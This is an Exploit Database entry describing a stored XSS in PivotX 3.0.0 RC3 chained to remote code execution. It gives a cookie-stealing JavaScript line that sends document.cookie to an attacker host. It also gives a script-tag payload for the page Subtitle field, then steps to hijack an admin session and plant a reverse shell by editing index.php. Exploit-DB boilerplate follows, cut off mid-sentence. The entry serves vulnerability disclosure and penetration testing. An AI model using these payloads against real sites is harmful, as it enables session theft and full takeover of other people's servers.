# Exploit Title: PivotX v3.0.0 RC3 - Stored XSS to Remote Code Execution (RCE)
# Date: July 2025
# Exploit Author: HayToN
# Vendor Homepage: https://github.com/pivotx
# Software Link: https://github.com/pivotx/PivotX
# Version: 3.0.0 RC3
# Tested on: Debian 11, PHP 7.4
# CVE : CVE-2025-52367

## Vulnerability Type:
Stored Cross-Site Scripting (XSS) in the "title" and "subtitle" fields of page creation. The input is not sanitized and is stored directly to disk via PHP serialize().

## Root Cause:
In 'modules/pages_flat.php', function 'savePage($page)' stores page data via 'saveSerialize()' without any sanitization. The stored values are later rendered in the admin panel without escaping.

Only the 'body' and 'introduction' fields are passed through TinyMCE (which encodes HTML). 'title' and 'subtitle' are rendered as raw HTML.

Note: If you are already admin, skip steps 1-7
## Exploitation Steps:
1. Login as an authenticated user (normal user, no need for admin).

2. Create a new Page via the dashboard, located at http://IP/PivotX/pivotx/index.php?page=page

3. Create locally a JavaScript file contaning cookie stealing code.
For example: lol.js
Containing:
document.location = 'http://LOCAL_IP/bruh?c=' + document.cookie;

4. In the "Subtitle" field, input the following payload(Be sure to change the file name as yours):

<script src="http://LOCAL_IP/lol.js"></script>

5. Publish the page.

6. When an admin views the published page in the blog, the XSS will execute in the admin’s context.

7. Using this XSS, send a payload to steal the admin's cookies, then insert the cookies on your site.

8. Navigate as admin, to http://IP/PivotX/pivotx/index.php?page=homeexplore, where you can edit index.php file

9. Edit index.php file to any php file you want to gain RCE on the target, could be with reverse shell or any other method.

10. Visit http://IP/PivotX/index.php and you should get a reverse shell :)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconf...
